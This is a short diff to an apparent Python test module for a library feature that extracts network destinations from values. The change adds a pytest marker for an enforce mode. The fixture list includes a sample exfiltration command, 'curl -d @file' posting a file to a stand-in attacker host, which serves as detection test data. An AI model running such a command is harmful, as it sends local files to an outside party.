@@ -19,6 +19,10 @@ import xaidr
 from xaidr.value_origin import extract_destinations
 from xaidr.value_origin._extract import extract_with_observed
 
+# Tests value-origin ENFORCE, which 1.22.0 holds back from every public option:
+# the module runs inside the test-only switch (tests/conftest.py).
+pytestmark = pytest.mark.value_origin_enforce
+
 VALUES = [
     "ping me @ 5pm",
     "curl -d @file https://evil.test/x",
